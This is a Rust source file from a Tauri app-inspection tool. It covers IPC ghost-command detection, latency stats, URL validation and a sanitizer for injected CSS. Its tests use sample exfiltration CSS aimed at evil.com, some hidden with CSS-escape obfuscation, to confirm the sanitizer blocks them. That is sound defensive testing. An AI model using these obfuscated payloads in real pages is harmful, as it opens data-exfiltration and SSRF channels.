use rmcp::model::{CallToolResult, Content};

/// Produce a properly escaped JavaScript string literal (with double quotes).
///
/// Non-ASCII characters are escaped to `\uXXXX` sequences to avoid corruption
/// in Tauri's `WebView2` eval pipeline on Windows, which mangles raw UTF-8 bytes.
pub fn js_string(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('"');
    for ch in s.chars() {
        match ch {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            '\0' => out.push_str("\\u0000"),
            c if c.is_ascii_graphic() || c == ' ' => out.push(c),
            c => {
                for unit in c.encode_utf16(&mut [0; 2]) {
                    use std::fmt::Write;
                    let _ = write!(out, "\\u{unit:04x}");
                }
            }
        }
    }
    out.push('"');
    out
}

/// JavaScript-style truthiness for a JSON value.
///
/// Mirrors what `if (value)` would do in the webview after `eval_js`: `false`,
/// `null`, `0`, `NaN`, `""`, and (pragmatically) empty arrays/objects are falsy;
/// everything else is truthy. Used by `wait_for` with the `expression` condition.
#[must_use]
pub fn json_truthy(value: &serde_json::Value) -> bool {
    match value {
        serde_json::Value::Null => false,
        serde_json::Value::Bool(b) => *b,
        serde_json::Value::Number(n) => n.as_f64().is_some_and(|f| f != 0.0 && !f.is_nan()),
        serde_json::Value::String(s) => !s.is_empty(),
        serde_json::Value::Array(a) => !a.is_empty(),
        serde_json::Value::Object(o) => !o.is_empty(),
    }
}

/// Build the JS that projects the webview IPC log down to just command names for
/// `detect_ghost_commands`.
///
/// When `since_ms` is `Some(ms)` with `ms > 0`, only commands invoked within the
/// last `ms` milliseconds are included. This is a **non-destructive** way to scope
/// ghost detection to the current test's traffic — the alternative,
/// `logs {action:'clear'}`, wipes the session-persistent IPC ring buffer for every
/// other reader. The cutoff is evaluated in the webview's own clock (`Date.now()`),
/// so there is no Rust↔JS clock skew. A non-positive or absent `since_ms` projects
/// the whole accumulated log (the historical behavior).
#[must_use]
pub fn ghost_ipc_projection_js(since_ms: Option<i64>) -> String {
    let filter = match since_ms {
        Some(ms) if ms > 0 => format!(
            ".filter(function(c){{ return c && c.timestamp && c.timestamp >= (Date.now() - {ms}); }})"
        ),
        _ => String::new(),
    };
    format!(
        "return (window.__VICTAURI__?.getIpcLog() || []){filter}\
         .map(function(c){{ return (c && c.command) || null; }})\
         .filter(function(x){{ return x; }})"
    )
}

/// Build the JS that projects the webview IPC log down to a per-command **outcome**
/// summary for `detect_ghost_commands`: `{{ command, ok, err }}` per distinct command.
///
/// This is the basis of outcome-based ghost detection (VIC-1). A command that returned
/// success (`ok`) at least once **demonstrably has a backend handler** and can never be a
/// ghost — regardless of whether the app registered it via `#[inspectable]`. A command that
/// only ever errored with a "not found" message is a confirmed ghost. Aggregating per
/// command (not per call) keeps the payload tiny even on a busy app (the same eval-cap
/// concern that made the names-only projection necessary); the error sample is capped.
#[must_use]
pub fn ghost_ipc_outcomes_js(since_ms: Option<i64>) -> String {
    let filter = match since_ms {
        Some(ms) if ms > 0 => format!(
            ".filter(function(c){{ return c && c.timestamp && c.timestamp >= (Date.now() - {ms}); }})"
        ),
        _ => String::new(),
    };
    format!(
        "return (function() {{\
         \n  var log = (window.__VICTAURI__?.getIpcLog() || []){filter};\
         \n  var byCmd = {{}};\
         \n  for (var i = 0; i < log.length; i++) {{\
         \n    var c = log[i]; if (!c || !c.command) continue;\
         \n    var e = byCmd[c.command] || {{ command: c.command, ok: false, err: null }};\
         \n    if (c.status === 'ok') {{ e.ok = true; }}\
         \n    else if (c.status === 'error') {{\
         \n      var body = ((c.result != null ? String(c.result) : '') + ' ' + (c.error != null ? String(c.error) : ''));\
         \n      var sample = body.slice(0, 160).toLowerCase();\
         \n      /* keep the most diagnostic sample: a 'not found' error always wins over a generic one */\
         \n      if (!e.err || sample.indexOf('not found') !== -1) {{ e.err = sample; }}\
         \n    }}\
         \n    byCmd[c.command] = e;\
         \n  }}\
         \n  return Object.keys(byCmd).map(function(k) {{ return byCmd[k]; }});\
         \n}})();"
    )
}

/// A per-command IPC outcome observed in the webview log (parsed from
/// [`ghost_ipc_outcomes_js`]).
#[derive(Debug, serde::Deserialize)]
pub struct IpcOutcome {
    /// The invoked command name.
    pub command: String,
    /// `true` if the command returned success (HTTP 200) at least once → it provably has a
    /// backend handler.
    #[serde(default)]
    pub ok: bool,
    /// A lowercased sample of an error response (for not-found detection); `None` if the
    /// command never errored.
    #[serde(default)]
    pub err: Option<String>,
}

/// Tauri framework/plugin commands (e.g. `plugin:event|emit`, `plugin:updater|check`) are
/// never application-level ghosts — they are handled by Tauri or its plugins, not the app's
/// `generate_handler!`. (Victauri's own `plugin:victauri|*` traffic is already filtered out
/// at the JS layer.)
fn is_framework_builtin(name: &str) -> bool {
    name.starts_with("plugin:")
}

/// Does an error sample indicate the COMMAND has no backend handler (a true ghost)? Tauri
/// rejects an unregistered command with a "command `<name>` not found"-class message.
///
/// A bare "not found" is deliberately NOT enough — it also matches ordinary application errors
/// (e.g. a real `get_user` handler returning "user not found"), which would be a false ghost. So
/// "not found" only counts when the message also references the command (the word "command" or
/// the command name itself), matching Tauri's actual not-found format. "unknown command" /
/// "not registered" are unambiguous and match on their own. A permission failure
/// ("not allowed"/"forbidden") is intentionally NOT matched — the handler exists, it is blocked.
fn error_means_not_found(err: &str, command: &str) -> bool {
    err.contains("unknown command")
        || err.contains("not registered")
        || (err.contains("not found")
            && (err.contains("command") || err.contains(&command.to_lowercase())))
}

/// Build the enriched ghost-command report from observed IPC OUTCOMES (VIC-1).
///
/// Replaces the registry-only diff — which falsely flagged every real-but-uninstrumented
/// command (e.g. 4DA's `set_language`) and every framework builtin as a ghost — with an
/// outcome-based classification that is correct regardless of how much the app uses
/// `#[inspectable]`:
///
/// * **`confirmed_ghosts`** — invoked, never succeeded, errored "not found": real ghosts
///   (no backend handler), high confidence, registry-independent.
/// * **`verified_handlers`** — returned success at least once → a handler provably exists →
///   never flagged (this is what excludes `set_language`).
/// * **`frontend_only`** — weaker candidate tier: invoked, absent from the registry, NOT a
///   framework builtin, and never observed succeeding. Confirm against the app's
///   `generate_handler!` before treating as a bug.
/// * **`excluded_builtins`** — framework `plugin:*` commands, surfaced for transparency.
///
/// Output is additive JSON (no Rust API break); `registry_only` is unchanged.
#[must_use]
pub fn build_ghost_report(
    outcomes: &[IpcOutcome],
    registry: &victauri_core::CommandRegistry,
) -> serde_json::Value {
    use std::collections::HashSet;

    let invoked: Vec<String> = outcomes.iter().map(|o| o.command.clone()).collect();
    let handled: HashSet<&str> = outcomes
        .iter()
        .filter(|o| o.ok)
        .map(|o| o.command.as_str())
        .collect();
    let report = victauri_core::detect_ghost_commands(&invoked, registry);

    // Confirmed ghosts: never succeeded, not a framework builtin, errored "not found".
    let mut confirmed: Vec<(&str, &str)> = Vec::new();
    for o in outcomes {
        if !o.ok
            && !is_framework_builtin(&o.command)
            && let Some(err) = o.err.as_deref()
            && error_means_not_found(err, &o.command)
        {
            confirmed.push((o.command.as_str(), err));
        }
    }
    let confirmed_names: HashSet<&str> = confirmed.iter().map(|(n, _)| *n).collect();

    // Corrected `frontend_only`: registry-absent candidates, minus proven handlers, minus
    // framework builtins, minus the already-listed confirmed ghosts.
    let frontend_only: Vec<_> = report
        .frontend_only
        .iter()
        .filter(|g| {
            !handled.contains(g.name.as_str())
                && !is_framework_builtin(&g.name)
                && !confirmed_names.contains(g.name.as_str())
        })
        .cloned()
        .collect();

    let excluded_builtins: Vec<&str> = report
        .frontend_only
        .iter()
        .map(|g| g.name.as_str())
        .filter(|n| is_framework_builtin(n))
        .collect();

    let registry_total = report.total_registry_commands;
    let reliability = if registry_total > 0 { "high" } else { "low" };
    let note = format!(
        "Outcome-based ghost detection. `confirmed_ghosts` ({confirmed}) were invoked, never \
         returned success, and errored 'not found' — real missing-handler bugs, high confidence, \
         independent of the registry. `verified_handlers` ({verified}) returned success so they \
         provably HAVE a handler and are never flagged (this is why a real command such as \
         set_language is no longer a false positive). `frontend_only` ({fe}) is the weaker \
         candidate tier: invoked, never observed succeeding, not a framework builtin, and absent \
         from the introspection registry ({registry_total} known) — confirm against the app's \
         generate_handler! before filing. `excluded_builtins` are Tauri/plugin framework \
         commands, never app ghosts. The `reliability` field describes only `frontend_only`; \
         `confirmed_ghosts` is high-confidence regardless.",
        confirmed = confirmed.len(),
        verified = handled.len(),
        fe = frontend_only.len(),
    );

    serde_json::json!({
        "confirmed_ghosts": confirmed
            .iter()
            .map(|(name, error)| serde_json::json!({ "name": name, "error": error }))
            .collect::<Vec<_>>(),
        "verified_handlers": handled.len(),
        "frontend_only": frontend_only,
        "excluded_builtins": excluded_builtins,
        "registry_only": report.registry_only,
        "total_frontend_commands": report.total_frontend_commands,
        "total_registry_commands": registry_total,
        "reliability": reliability,
        "note": note,
    })
}

/// Project the webview IPC log down to `{command, duration_ms}` pairs only — never
/// the request/response bodies.
///
/// The full `getIpcLog()` carries request args + response bodies; on a heavy-traffic
/// real app that easily exceeds the eval result cap, which silently returned an empty
/// string and made `coverage`/`command_timings` report **zero** real traffic even
/// while the app was making hundreds of calls. This minimal projection stays small.
/// `since_ms` time-windows like [`ghost_ipc_projection_js`].
#[must_use]
pub fn ipc_timing_projection_js(since_ms: Option<i64>) -> String {
    let filter = match since_ms {
        Some(ms) if ms > 0 => format!(
            ".filter(function(c){{ return c && c.timestamp && c.timestamp >= (Date.now() - {ms}); }})"
        ),
        _ => String::new(),
    };
    format!(
        "return (window.__VICTAURI__?.getIpcLog() || []){filter}\
         .map(function(c){{ return (c && c.command) ? {{ command: c.command, \
         duration_ms: (typeof c.duration_ms === 'number' ? c.duration_ms : null) }} : null; }})\
         .filter(function(x){{ return x; }})"
    )
}

/// Compute per-command latency stats (count / min / max / avg / p95 ms) from raw IPC
/// `{command, duration_ms}` entries produced by [`ipc_timing_projection_js`].
///
/// Pending calls (null `duration_ms`) count toward `call_count` but not the latency
/// figures (`timed_samples` reports how many had a measured duration). Output is
/// sorted by `call_count` descending. This turns the live IPC log into a real
/// profile of the app's own frontend traffic — the data `command_timings` was blind
/// to because its counter only sees Victauri-driven `invoke_command` calls.
#[must_use]
pub fn ipc_timing_stats(entries: &[serde_json::Value]) -> Vec<serde_json::Value> {
    use std::collections::BTreeMap;
    let mut counts: BTreeMap<String, usize> = BTreeMap::new();
    let mut durations: BTreeMap<String, Vec<f64>> = BTreeMap::new();
    for e in entries {
        let Some(cmd) = e.get("command").and_then(|c| c.as_str()) else {
            continue;
        };
        *counts.entry(cmd.to_string()).or_default() += 1;
        if let Some(d) = e.get("duration_ms").and_then(serde_json::Value::as_f64) {
            durations.entry(cmd.to_string()).or_default().push(d);
        }
    }

    let mut out: Vec<serde_json::Value> = counts
        .into_iter()
        .map(|(cmd, call_count)| {
            let mut durs = durations.remove(&cmd).unwrap_or_default();
            durs.sort_by(|a, b| a.partial_cmp(b).unwrap_or(std::cmp::Ordering::Equal));
            let n = durs.len();
            let (min, max, avg, p95) = if n == 0 {
                (None, None, None, None)
            } else {
                let sum: f64 = durs.iter().sum();
                let p95_idx = (((n as f64) * 0.95).ceil() as usize)
                    .saturating_sub(1)
                    .min(n - 1);
                let round1 = |v: f64| (v * 10.0).round() / 10.0;
                (
                    Some(round1(durs[0])),
                    Some(round1(durs[n - 1])),
                    Some(round1(sum / n as f64)),
                    Some(round1(durs[p95_idx])),
                )
            };
            serde_json::json!({
                "command": cmd,
                "call_count": call_count,
                "timed_samples": n,
                "min_ms": min,
                "max_ms": max,
                "avg_ms": avg,
                "p95_ms": p95,
            })
        })
        .collect();

    out.sort_by(|a, b| {
        b.get("call_count")
            .and_then(serde_json::Value::as_u64)
            .cmp(&a.get("call_count").and_then(serde_json::Value::as_u64))
    });
    out
}

pub fn json_result(value: &impl serde::Serialize) -> CallToolResult {
    match serde_json::to_string_pretty(value) {
        Ok(json) => CallToolResult::success(vec![Content::text(json)]),
        Err(e) => tool_error(e.to_string()),
    }
}

pub fn tool_error(msg: impl Into<String>) -> CallToolResult {
    let mut result = CallToolResult::success(vec![Content::text(msg)]);
    result.is_error = Some(true);
    result
}

pub fn tool_disabled(name: &str) -> CallToolResult {
    tool_error_with_hint(
        format!("tool '{name}' is disabled by privacy configuration"),
        RecoveryHint::ReportToUser,
    )
}

#[derive(Debug, Clone, Copy)]
pub enum RecoveryHint {
    CheckInput,
    ReportToUser,
}

impl RecoveryHint {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::CheckInput => "CHECK_INPUT",
            Self::ReportToUser => "REPORT_TO_USER",
        }
    }
}

pub fn tool_error_with_hint(msg: impl Into<String>, hint: RecoveryHint) -> CallToolResult {
    let message = msg.into();
    let text = format!(
        "{message}

[hint: {}]",
        hint.as_str()
    );
    let mut result = CallToolResult::success(vec![Content::text(text)]);
    result.is_error = Some(true);
    result
}

pub fn missing_param(param: &str, action: &str) -> CallToolResult {
    tool_error_with_hint(
        format!("missing required parameter '{param}' for action '{action}'"),
        RecoveryHint::CheckInput,
    )
}

/// Validate a URL for navigation.
///
/// Only `http` and `https` schemes are allowed by default. The `file` scheme
/// is blocked unless `allow_file` is `true` (opt-in via
/// [`VictauriBuilder::allow_file_navigation`](crate::VictauriBuilder::allow_file_navigation)).
pub fn validate_url(url: &str, allow_file: bool) -> Result<(), String> {
    let trimmed: String = url.chars().filter(|c| !c.is_control()).collect();
    match url::Url::parse(&trimmed) {
        Ok(parsed) => match parsed.scheme() {
            "http" | "https" => Ok(()),
            "file" if allow_file => Ok(()),
            "file" => Err("scheme 'file' is not allowed by default; enable with \
                 VictauriBuilder::allow_file_navigation()"
                .to_string()),
            scheme => Err(format!(
                "scheme '{scheme}' is not allowed; use http or https"
            )),
        },
        Err(e) => Err(format!("invalid URL: {e}")),
    }
}

pub fn sanitize_css_color(color: &str) -> Result<String, String> {
    let s = color.trim();
    if s.len() > 100 {
        return Err("CSS color value too long".to_string());
    }
    // Reject CSS escape sequences (\XX hex escapes)
    if s.contains('\\') {
        return Err("CSS escape sequences not allowed in color values".to_string());
    }
    let valid = s
        .chars()
        .all(|c| c.is_alphanumeric() || matches!(c, '#' | '(' | ')' | ',' | '.' | ' ' | '%' | '-'));
    if !valid {
        return Err("invalid characters in CSS color value".to_string());
    }
    let lower = s.to_lowercase();
    if lower.contains("url(") || lower.contains("expression(") {
        return Err("invalid CSS color value".to_string());
    }
    Ok(s.to_string())
}

/// Strip CSS `/* ... */` comments so a scan cannot be evaded by hiding `@import`/`url(`
/// inside a comment that the browser's CSS parser ignores.
fn strip_css_comments(css: &str) -> String {
    let bytes = css.as_bytes();
    let mut out = String::with_capacity(css.len());
    let mut i = 0;
    while i < bytes.len() {
        if i + 1 < bytes.len() && bytes[i] == b'/' && bytes[i + 1] == b'*' {
            i += 2;
            while i + 1 < bytes.len() && !(bytes[i] == b'*' && bytes[i + 1] == b'/') {
                i += 1;
            }
            i = (i + 2).min(bytes.len());
        } else {
            out.push(bytes[i] as char);
            i += 1;
        }
    }
    out
}

/// Decode CSS escape sequences so an obfuscated `\40 import` / `\75 rl(` / `\2f\2f`
/// can't slip past a literal-string scan that the browser's CSS parser would still
/// decode and act on. Handles the two CSS escape forms: `\` + 1–6 hex digits
/// (optionally followed by one whitespace) → that code point, and `\` + any other
/// char → that char literally. A trailing lone `\` is dropped.
fn decode_css_escapes(css: &str) -> String {
    let mut out = String::with_capacity(css.len());
    let mut chars = css.chars().peekable();
    while let Some(c) = chars.next() {
        if c != '\\' {
            out.push(c);
            continue;
        }
        // Collect up to 6 hex digits.
        let mut hex = String::new();
        while hex.len() < 6 && chars.peek().is_some_and(char::is_ascii_hexdigit) {
            hex.push(chars.next().unwrap());
        }
        if hex.is_empty() {
            // `\` + non-hex → literal next char (e.g. `\@` → `@`); lone `\` dropped.
            if let Some(next) = chars.next() {
                out.push(next);
            }
        } else {
            // One optional trailing whitespace terminates a hex escape.
            if chars.peek().is_some_and(char::is_ascii_whitespace) {
                chars.next();
            }
            match u32::from_str_radix(&hex, 16).ok().and_then(char::from_u32) {
                Some(decoded) => out.push(decoded),
                None => out.push('\u{FFFD}'),
            }
        }
    }
    out
}

/// Validate CSS submitted to `css inject` before it is added to the page. By default this
/// rejects two remote-fetch vectors that turn a debugging tool into a data-exfiltration /
/// `SSRF` channel (especially dangerous when chained with prompt injection from page-sourced
/// content): `@import` (pulls a remote stylesheet) and `url(...)` pointing at a remote
/// origin (`http(s)://`, protocol-relative `//host`, or any `scheme://`). Relative refs,
/// `data:` URIs, and `#fragment` refs are allowed. Set `allow_remote` to opt back in to
/// remote references when intentionally needed.
///
/// # Errors
/// Returns an error describing the rejected construct (or oversize input).
pub fn sanitize_injected_css(css: &str, allow_remote: bool) -> Result<(), String> {
    const MAX_CSS_LEN: usize = 256 * 1024;
    if css.len() > MAX_CSS_LEN {
        return Err(format!(
            "injected CSS too large ({} bytes, limit {MAX_CSS_LEN})",
            css.len()
        ));
    }
    if allow_remote {
        return Ok(());
    }
    // Strip comments, then DECODE escapes, then lowercase — so `\40 import` and
    // `\75 rl(` (and an escaped `\2f\2f` remote URL) are normalized to the forms
    // the scan below matches, closing the CSS-escape bypass.
    let scan = decode_css_escapes(&strip_css_comments(css)).to_ascii_lowercase();
    if scan.contains("@import") {
        return Err(
            "`@import` is blocked in injected CSS (it fetches a remote stylesheet — \
                    a data-exfiltration vector). Inline the rules, or pass `allow_remote: true`."
                .to_string(),
        );
    }
    // Inspect every `url(...)` argument for a remote target.
    let bytes = scan.as_bytes();
    let mut search_from = 0;
    while let Some(rel) = scan[search_from..].find("url(") {
        let arg_start = search_from + rel + 4;
        let arg_end = scan[arg_start..]
            .find(')')
            .map_or(scan.len(), |e| arg_start + e);
        let arg = bytes[arg_start..arg_end]
            .iter()
            .map(|&b| b as char)
            .collect::<String>();
        let trimmed = arg.trim().trim_matches(['\'', '"']).trim();
        if trimmed.starts_with("//") || trimmed.contains("://") {
            return Err(format!(
                "remote `url(...)` is blocked in injected CSS (`{}` would fetch a remote \
                 origin — a data-exfiltration vector). Use a relative or data: URL, or pass \
                 `allow_remote: true`.",
                trimmed.chars().take(80).collect::<String>()
            ));
        }
        search_from = arg_end;
    }
    Ok(())
}

#[cfg(test)]
mod json_truthy_tests {
    use super::json_truthy;
    use serde_json::json;

    #[test]
    fn falsy_values() {
        assert!(!json_truthy(&json!(null)));
        assert!(!json_truthy(&json!(false)));
        assert!(!json_truthy(&json!(0)));
        assert!(!json_truthy(&json!(0.0)));
        assert!(!json_truthy(&json!("")));
        assert!(!json_truthy(&json!([])));
        assert!(!json_truthy(&json!({})));
    }

    #[test]
    fn truthy_values() {
        assert!(json_truthy(&json!(true)));
        assert!(json_truthy(&json!(1)));
        assert!(json_truthy(&json!(-1)));
        assert!(json_truthy(&json!("ready")));
        assert!(json_truthy(&json!([1])));
        assert!(json_truthy(&json!({ "k": "v" })));
    }
}

#[cfg(test)]
mod ghost_projection_tests {
    use super::ghost_ipc_projection_js;

    #[test]
    fn projects_whole_log_when_since_absent() {
        let js = ghost_ipc_projection_js(None);
        assert!(js.contains("getIpcLog()"));
        assert!(js.contains(".map("));
        // No time window applied.
        assert!(!js.contains("Date.now()"));
        assert!(!js.contains("c.timestamp"));
    }

    #[test]
    fn applies_window_when_since_positive() {
        let js = ghost_ipc_projection_js(Some(5000));
        assert!(js.contains("c.timestamp"));
        assert!(js.contains("Date.now() - 5000"));
        // Window is applied before the name projection.
        let win = js.find("Date.now()").unwrap();
        let map = js.find(".map(").unwrap();
        assert!(win < map, "time filter must run before the name map");
    }

    #[test]
    fn ignores_nonpositive_since() {
        assert!(!ghost_ipc_projection_js(Some(0)).contains("Date.now()"));
        assert!(!ghost_ipc_projection_js(Some(-10)).contains("Date.now()"));
    }
}

#[cfg(test)]
mod injected_css_tests {
    use super::sanitize_injected_css;

    #[test]
    fn blocks_at_import() {
        assert!(sanitize_injected_css("@import url(https://evil.com/x.css);", false).is_err());
        // Even hidden behind a comment.
        assert!(sanitize_injected_css("/* x */@import 'https://evil.com';", false).is_err());
        // Comment-splitting obfuscation is caught because comments are stripped first:
        // `@imp/* */ort` collapses to `@import`.
        assert!(sanitize_injected_css("@imp/* */ort url(//evil.com)", false).is_err());
    }

    #[test]
    fn blocks_remote_url() {
        assert!(
            sanitize_injected_css("body{background:url(https://evil.com/x?d=1)}", false).is_err()
        );
        assert!(sanitize_injected_css("body{background:url('//evil.com/x')}", false).is_err());
        assert!(sanitize_injected_css("a{cursor:url(ftp://evil.com/c)}", false).is_err());
    }

    #[test]
    fn allows_local_and_data() {
        assert!(sanitize_injected_css("body{color:red}", false).is_ok());
        assert!(sanitize_injected_css("body{background:url('/assets/x.png')}", false).is_ok());
        assert!(sanitize_injected_css("body{background:url(#grad)}", false).is_ok());
        assert!(
            sanitize_injected_css("body{background:url(data:image/png;base64,AAAA)}", false)
                .is_ok()
        );
    }

    #[test]
    fn allow_remote_opts_back_in() {
        assert!(sanitize_injected_css("@import url(https://fonts.example/x.css);", true).is_ok());
        assert!(
            sanitize_injected_css("body{background:url(https://cdn.example/x.png)}", true).is_ok()
        );
    }

    #[test]
    fn blocks_css_escape_obfuscated_import() {
        // `\40 import` decodes to `@import`; `\100 6d port` style hex escapes too.
        assert!(sanitize_injected_css("\\40 import url(https://evil.com/x.css);", false).is_err());
        assert!(sanitize_injected_css("\\000040import 'https://evil.com';", false).is_err());
        // `\@import` (backslash + literal char) also normalizes to `@import`.
        assert!(sanitize_injected_css("\\@import url(//evil.com)", false).is_err());
    }

    #[test]
    fn blocks_css_escape_obfuscated_remote_url() {
        // `\75 rl(` decodes to `url(` (hex escape + space-terminator).
        assert!(
            sanitize_injected_css("body{background:\\75 rl(https://evil.com/x)}", false).is_err()
        );
        // Escaped protocol-relative `//` via unambiguous 6-digit escapes (matches CSS
        // greedy hex parsing: `\2f` followed by a hex char would eat it, so a real
        // attacker uses the 6-digit or space-terminated form).
        assert!(
            sanitize_injected_css("body{background:url(\\00002f\\00002fevil.com/x)}", false)
                .is_err()
        );
    }

    #[test]
    fn escape_decoding_preserves_legitimate_css() {
        // A legitimately-escaped local content value must still pass.
        assert!(sanitize_injected_css("a::before{content:'\\2022'}", false).is_ok());
        assert!(sanitize_injected_css("body{color:red}", false).is_ok());
    }
}

#[cfg(test)]
mod ipc_timing_tests {
    use super::{ipc_timing_projection_js, ipc_timing_stats};
    use serde_json::json;

    #[test]
    fn projection_is_body_free() {
        let js = ipc_timing_projection_js(None);
        // Only command + duration are projected — never request/response bodies, so
        // the result stays under the eval cap on busy apps (the bug that made the old
        // full-getIpcLog coverage path return zero).
        assert!(js.contains("c.command"));
        assert!(js.contains("duration_ms"));
        assert!(!js.contains("result"));
        assert!(!js.contains("args"));
        assert!(!js.contains("Date.now()"));
        assert!(ipc_timing_projection_js(Some(5000)).contains("Date.now() - 5000"));
    }

    #[test]
    fn stats_aggregate_per_command_with_percentiles() {
        let entries = vec![
            json!({ "command": "get_settings", "duration_ms": 10.0 }),
            json!({ "command": "get_settings", "duration_ms": 30.0 }),
            json!({ "command": "get_settings", "duration_ms": 20.0 }),
            json!({ "command": "save", "duration_ms": 5.0 }),
        ];
        let stats = ipc_timing_stats(&entries);
        assert_eq!(stats.len(), 2);
        // Sorted by call_count desc — get_settings (3) first.
        assert_eq!(stats[0]["command"], "get_settings");
        assert_eq!(stats[0]["call_count"], 3);
        assert_eq!(stats[0]["timed_samples"], 3);
        assert_eq!(stats[0]["min_ms"], 10.0);
        assert_eq!(stats[0]["max_ms"], 30.0);
        assert_eq!(stats[0]["avg_ms"], 20.0);
        assert_eq!(stats[1]["command"], "save");
        assert_eq!(stats[1]["call_count"], 1);
    }

    #[test]
    fn pending_calls_count_but_do_not_skew_latency() {
        let entries = vec![
            json!({ "command": "run_pipeline", "duration_ms": null }),
            json!({ "command": "run_pipeline", "duration_ms": 100.0 }),
        ];
        let stats = ipc_timing_stats(&entries);
        assert_eq!(stats[0]["call_count"], 2);
        assert_eq!(stats[0]["timed_samples"], 1);
        assert_eq!(stats[0]["avg_ms"], 100.0);
    }

    #[test]
    fn empty_input_yields_empty_stats() {
        assert!(ipc_timing_stats(&[]).is_empty());
    }
}

#[cfg(test)]
mod ghost_report_tests {
    use super::{IpcOutcome, build_ghost_report};
    use victauri_core::{CommandInfo, CommandRegistry};

    fn outcome(command: &str, ok: bool, err: Option<&str>) -> IpcOutcome {
        IpcOutcome {
            command: command.to_string(),
            ok,
            err: err.map(str::to_string),
        }
    }

    #[test]
    fn succeeded_command_is_never_a_ghost() {
        // VIC-1, the exact 4DA false positive: `set_language` is a real command the app uses;
        // it returns success. The old registry-diff flagged it as a ghost (the app has an empty
        // #[inspectable] registry). Outcome-based detection must classify it as a verified
        // handler and NEVER place it in frontend_only.
        let registry = CommandRegistry::new(); // empty — the 4DA scenario
        let v = build_ghost_report(&[outcome("set_language", true, None)], &registry);
        assert_eq!(v["verified_handlers"], 1);
        assert!(
            v["frontend_only"].as_array().unwrap().is_empty(),
            "a command that returned success must not be a ghost"
        );
        assert!(v["confirmed_ghosts"].as_array().unwrap().is_empty());
    }

    #[test]
    fn framework_builtins_are_excluded() {
        // plugin:event|emit / plugin:updater|check are Tauri framework commands, never app ghosts.
        let registry = CommandRegistry::new();
        let outcomes = [
            outcome("plugin:event|emit", false, Some("some error")),
            outcome("plugin:updater|check", false, None),
        ];
        let v = build_ghost_report(&outcomes, &registry);
        assert!(v["frontend_only"].as_array().unwrap().is_empty());
        assert!(v["confirmed_ghosts"].as_array().unwrap().is_empty());
        assert_eq!(v["excluded_builtins"].as_array().unwrap().len(), 2);
    }

    #[test]
    fn not_found_error_is_a_confirmed_ghost() {
        // A frontend call to a command with no handler errors "not found" → confirmed ghost,
        // high confidence, registry-independent. Not double-listed in frontend_only.
        let registry = CommandRegistry::new();
        let v = build_ghost_report(
            &[outcome(
                "get_widgetz",
                false,
                Some("command get_widgetz not found"),
            )],
            &registry,
        );
        let confirmed = v["confirmed_ghosts"].as_array().unwrap();
        assert_eq!(confirmed.len(), 1);
        assert_eq!(confirmed[0]["name"], "get_widgetz");
        assert!(v["frontend_only"].as_array().unwrap().is_empty());
    }

    #[test]
    fn app_level_not_found_is_not_a_confirmed_ghost() {
        // A real command returning an application "X not found" error (here `get_user` →
        // "user not found") must NOT be mistaken for a missing-handler ghost: the message does
        // not reference the command/handler. It falls to the weak candidate tier instead.
        let registry = CommandRegistry::new();
        let v = build_ghost_report(
            &[outcome("get_user", false, Some("user not found"))],
            &registry,
        );
        assert!(
            v["confirmed_ghosts"].as_array().unwrap().is_empty(),
            "an app-level 'not found' must not be a confirmed ghost: {}",
            v["confirmed_ghosts"]
        );
        assert_eq!(v["frontend_only"].as_array().unwrap().len(), 1);
    }

    #[test]
    fn never_succeeded_unregistered_is_a_weak_candidate() {
        // Errored for a NON-not-found reason, not in registry, not a builtin, never succeeded:
        // a frontend_only candidate (weaker tier), not a confirmed ghost.
        let registry = CommandRegistry::new();
        let v = build_ghost_report(
            &[outcome(
                "save_thing",
                false,
                Some("validation failed: bad arg"),
            )],
            &registry,
        );
        assert!(v["confirmed_ghosts"].as_array().unwrap().is_empty());
        let fo = v["frontend_only"].as_array().unwrap();
        assert_eq!(fo.len(), 1);
        assert_eq!(fo[0]["name"], "save_thing");
    }

    #[test]
    fn registered_command_is_not_flagged_even_if_it_only_errored() {
        // A command present in the registry is known to exist; even if it only errored this
        // session it is never frontend_only.
        let registry = CommandRegistry::new();
        registry.register(CommandInfo::new("known_cmd"));
        let v = build_ghost_report(&[outcome("known_cmd", false, Some("oops"))], &registry);
        assert!(v["frontend_only"].as_array().unwrap().is_empty());
    }
}
